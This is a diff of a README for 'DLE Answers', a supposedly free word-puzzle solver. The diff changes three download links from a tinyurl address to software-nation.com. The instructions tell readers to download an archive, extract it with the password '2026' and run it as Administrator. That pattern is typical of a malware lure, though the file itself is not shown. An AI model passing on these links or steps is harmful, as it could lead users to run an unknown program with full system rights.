@@ -9,7 +9,7 @@ The **💡 DLE Answers** is a **free** puzzle-solving assistant for Daily Word G
 
 <div align="center">
 
-[![Download DLE Answers](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/dle-answers)
+[![Download DLE Answers](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/dle-answers)
 
 </div>
 
@@ -96,7 +96,7 @@ Word puzzles are fun but can be frustrating. This educational tool helps you lea
 2. **📦 Extract the archive** — password: `2026`
 3. **🖱️ Run as Administrator** → Enter your known letters → Get answers
 
-[![Download DLE Answers](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/dle-answers)
+[![Download DLE Answers](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/dle-answers)
 
 ### Detailed Installation (April 2026 Update)
 
@@ -248,7 +248,7 @@ Solve any word puzzle and learn new vocabulary for free. **DLE Answers** helps y
 
 <div align="center">
 
-[![Download DLE Answers](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/dle-answers)
+[![Download DLE Answers](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/dle-answers)
 
 **Version 4.6.1** — Educational puzzle solver. April 2026 update. Zero cost. No payment.
 
